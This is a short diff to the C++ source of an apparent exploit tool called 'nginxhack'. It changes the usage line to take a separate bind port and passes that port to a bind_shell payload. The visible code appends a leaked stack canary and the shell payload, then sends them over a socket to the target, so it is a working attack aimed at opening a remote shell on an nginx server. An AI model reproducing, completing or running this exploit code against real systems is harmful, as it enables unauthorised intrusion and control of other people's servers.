@@ -1,8 +1,8 @@
 #include "hdr.h"
 
 int main(int argc, char* argv[]) {
-    if (argc != 3) {
-        cout << "Usage:" << endl << "nginxhack [target] [target port]" << endl;
+    if (argc != 4) {
+        cout << "Usage:" << endl << "nginxhack [target] [target port] [target bind port]" << endl;
         return 1;
     }
 
@@ -65,7 +65,7 @@ int main(int argc, char* argv[]) {
     payload += canary;
     cout << "Found canary" << endl;
     
-    payload += (char*)bind_shell(stoi(argv[2]));
+    payload += (char*)bind_shell(stoi(argv[3]));
 
     cout << endl << "Injecting bind shell..." << endl;
     if (send(sock, payload.c_str(), payload.length(), NULL) == SOCKET_ERROR) {
